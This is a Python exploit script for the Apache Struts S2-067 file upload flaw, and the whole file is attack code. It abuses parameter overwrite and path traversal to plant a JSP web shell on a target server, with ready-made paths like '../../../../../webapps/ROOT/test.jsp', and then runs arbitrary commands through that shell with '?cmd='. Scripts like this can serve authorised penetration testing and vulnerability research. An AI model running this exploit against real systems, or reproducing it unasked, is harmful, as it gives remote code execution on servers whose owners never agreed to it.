import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string
import os

def upload_file(target_url, upload_endpoint, file_paths, destination_path, allowed_types=None, allowed_extensions=None, simulate_i18n=False, execute_command=None):
    """
    Upload files to the target using parameter overwrite and path traversal.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading files to {upload_url}...")

    headers = {"User-Agent": "Mozilla/5.0"}

    for file_path in file_paths:
        with open(file_path, "rb") as f:
            file_content = f.read()

        fields = {
            "Upload": (os.path.basename(file_path), file_content, "text/plain"),
            "top.UploadFileName": destination_path,
        }

        if simulate_i18n:
            simulate_i18n_errors()

        # Simulate MIME type and extension restrictions
        if allowed_types:
            headers["Content-Type"] = allowed_types
        if allowed_extensions and not destination_path.endswith(tuple(allowed_extensions)):
            print(f"[WARNING] File extension {destination_path.split('.')[-1]} might not be allowed.")

        try:
            m = MultipartEncoder(fields=fields, boundary='----WebKitFormBoundary' + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=16)))
            headers["Content-Type"] = m.content_type

            response = requests.post(upload_url, headers=headers, data=m, timeout=10)
            if response.status_code == 200:
                print(f"[SUCCESS] File {os.path.basename(file_path)} uploaded successfully: {destination_path}")
                verify_uploaded_file(target_url, destination_path, execute_command)
            else:
                print(f"[ERROR] Upload failed for {os.path.basename(file_path)}. HTTP {response.status_code}")
        except requests.RequestException as e:
            print(f"[ERROR] Request failed for {os.path.basename(file_path)}: {e}")

def verify_uploaded_file(target_url, file_path, execute_command):
    """Verify if the uploaded file is accessible and optionally execute a command."""
    file_url = urljoin(target_url, file_path)
    print(f"[INFO] Verifying uploaded file: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200:
            print(f"[ALERT] File uploaded and accessible: {file_url}")
            if execute_command:
                execute_remote_command(file_url, execute_command)
        else:
            print(f"[INFO] File not accessible. HTTP Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")

def execute_remote_command(file_url, command):
    """Execute a command on the uploaded WebShell."""
    command_url = f"{file_url}?cmd={command}"
    print(f"[INFO] Executing command: {command_url}")
    try:
        response = requests.get(command_url, timeout=10)
        if response.status_code == 200:
            print(f"[INFO] Command output:\n{response.text}")
        else:
            print(f"[ERROR] Command execution failed. HTTP Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Command execution failed: {e}")

def simulate_i18n_errors():
    """Simulate i18n file error handling scenarios."""
    errors = {
        "struts.messages.error.uploading": "Error uploading file.",
        "struts.messages.error.file.too.large": "The file size exceeds the maximum limit.",
        "struts.messages.error.content.type.not.allowed": "The file type is not allowed.",
        "struts.messages.error.file.extension.not.allowed": "The file extension is not allowed."
    }
    for key, message in errors.items():
        print(f"[I18N SIMULATION] {key}: {message}")

def predefined_paths():
    """Return a list of common test paths for path traversal."""
    return [
        "../../../../../webapps/ROOT/test.jsp",
        "/tmp/webshell.jsp",
        "/var/www/html/shell.jsp"
    ]

def main():
    parser = argparse.ArgumentParser(description="S2-067 Exploit - Testing Deprecated File Upload Interceptor with Multiple File Uploads")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to upload endpoint (e.g., /uploads.action)")
    parser.add_argument("--files", required=True, help="Comma-separated list of file paths to upload")
    parser.add_argument("--destination", required=True, help="Target destination path for uploaded files")
    parser.add_argument("--allowed_types", help="Simulated allowed MIME types (e.g., application/octet-stream)")
    parser.add_argument("--allowed_extensions", nargs="+", help="Simulated allowed file extensions (e.g., .jsp, .txt)")
    parser.add_argument("--simulate_i18n", action="store_true", help="Simulate i18n error handling scenarios")
    parser.add_argument("--execute", help="Command to execute on the uploaded file (e.g., whoami)")
    args = parser.parse_args()

    file_paths = args.files.split(",")
    upload_file(
        target_url=args.url,
        upload_endpoint=args.upload_endpoint,
        file_paths=file_paths,
        destination_path=args.destination,
        allowed_types=args.allowed_types,
        allowed_extensions=args.allowed_extensions,
        simulate_i18n=args.simulate_i18n,
        execute_command=args.execute
    )

if __name__ == "__main__":
    main()
